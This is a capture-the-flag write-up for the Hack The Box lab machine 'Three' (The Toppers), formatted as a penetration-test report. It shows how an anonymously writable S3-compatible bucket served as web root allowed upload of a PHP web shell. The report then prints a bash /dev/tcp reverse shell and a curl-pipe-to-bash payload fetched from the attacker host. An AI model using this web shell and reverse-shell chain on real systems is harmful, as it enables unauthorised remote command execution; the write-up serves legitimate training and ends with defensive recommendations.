

## Target: *Three* – Hack The Box (Starting Point)

---

## 1. Executive Summary

This assessment was conducted against the Hack The Box Starting Point machine **“The Toppers”**.
The objective was to identify security weaknesses, exploit them, and obtain proof of compromise.

During the engagement, a **misconfigured S3-compatible object storage service** was identified that allowed **anonymous read and write access**. This misconfiguration enabled **arbitrary file upload**, which was leveraged to upload a **PHP web shell**, leading to **remote command execution** and a **reverse shell** on the target system.

---

## 2. Scope & Environment

* **Target IP**: `10.129.227.248`
* **Target Domain**: `thetoppers.htb`
* **Assessment Type**: Black-box penetration test
* **Platform**: Hack The Box – Starting Point
* **Attacker Machine**: Kali Linux

---

## 3. Methodology

The engagement followed a standard penetration testing methodology:

1. Reconnaissance
2. Enumeration
3. Vulnerability Identification
4. Exploitation
5. Post-Exploitation & Proof of Access

---

## 4. Reconnaissance

### 4.1 Manual Web Inspection

Accessing the target IP in a browser revealed a **band landing page**.
Reviewing the page content exposed an email address using the domain:

```
thetoppers.htb
```

Since `.htb` is not a public TLD, local DNS resolution was required.

### 4.2 Host Resolution Setup

The domain was mapped locally:

```bash
sudo sh -c 'echo "10.129.227.248 thetoppers.htb" >> /etc/hosts'
```

Verification confirmed correct resolution.

---

## 5. Enumeration

### 5.1 Port Scanning

A full service scan was performed:

```bash
nmap -A 10.129.227.248
```

**Open Ports Identified:**

| Port | Service | Version |
| ---- | ------- | ------- |
| 22   | SSH     | OpenSSH |
| 80   | HTTP    | Apache  |

SSH required credentials and was not immediately exploitable, so focus shifted to HTTP.

---

### 5.2 Directory Enumeration

Directory brute-forcing was performed:

```bash
gobuster dir -u 10.129.227.248 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html
```

No sensitive directories were discovered.

---

### 5.3 Virtual Host Enumeration

Virtual host enumeration revealed an additional subdomain:

```bash
gobuster vhost -u http://thetoppers.htb \
-w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
--append-domain
```

**Discovered Subdomain:**

```
s3.thetoppers.htb
```

The subdomain was added to `/etc/hosts`:

```bash
sudo sh -c 'echo "10.129.227.248 s3.thetoppers.htb" >> /etc/hosts'
```

---

## 6. Vulnerability Identification

### 6.1 S3-Compatible Object Storage Exposure

Accessing `http://s3.thetoppers.htb` returned:

```json
{"status":"running"}
```

This indicated an **S3-compatible object storage service** (e.g., MinIO).

Using the AWS CLI with arbitrary credentials:

```bash
aws configure
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

The service allowed **unauthenticated access**.

### 6.2 Bucket Enumeration

Listing bucket contents:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

Files discovered:

* `index.php`
* `.htaccess`

The presence of `index.php` confirmed that the bucket contents were mapped to the web root.

---

## 7. Exploitation

### 7.1 Arbitrary File Upload

A PHP web shell was created:

```php
<?php system($_GET["cmd"]); ?>
```

Uploaded to the bucket:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

### 7.2 Remote Command Execution

The web shell was accessed:

```
http://thetoppers.htb/shell.php?cmd=id
```

**Result:**

```
uid=33(www-data) gid=33(www-data)
```

This confirmed **remote command execution** as the web server user.

---

## 8. Post-Exploitation

### 8.1 Reverse Shell Setup

A reverse shell payload was created:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.56/4444 0>&1
```

The payload was hosted locally:

```bash
python3 -m http.server 8000
```

A listener was started:

```bash
nc -lvnp 4444
```

### 8.2 Reverse Shell Execution

The web shell was used to download and execute the payload:

```
http://thetoppers.htb/shell.php?cmd=curl%2010.10.15.56:8000/shell.sh|bash
```

A reverse shell was successfully received.

---

## 9. Proof of Compromise

From the reverse shell:

```bash
whoami
```

Output:

```
www-data
```

Flag retrieval:

```bash
cat ../flag.txt
```

This confirmed **full compromise of the challenge objectives**.

---

## 10. Findings Summary

| ID | Vulnerability                             | Severity |
| -- | ----------------------------------------- | -------- |
| 1  | Anonymous access to S3-compatible storage | Critical |
| 2  | Arbitrary file upload                     | Critical |
| 3  | Remote command execution                  | Critical |

---

## 11. Recommendations

1. Disable anonymous access on object storage services.
2. Enforce authentication and access control policies.
3. Prevent execution of uploaded files.
4. Separate storage services from web execution contexts.
5. Monitor and log object storage access.

---

## 12. Conclusion

The compromise of **The Toppers** was achieved through a **chain of misconfigurations**, beginning with exposed object storage and ending in full remote command execution.
This attack required no credentials and demonstrates the critical risk posed by improperly secured cloud storage services.
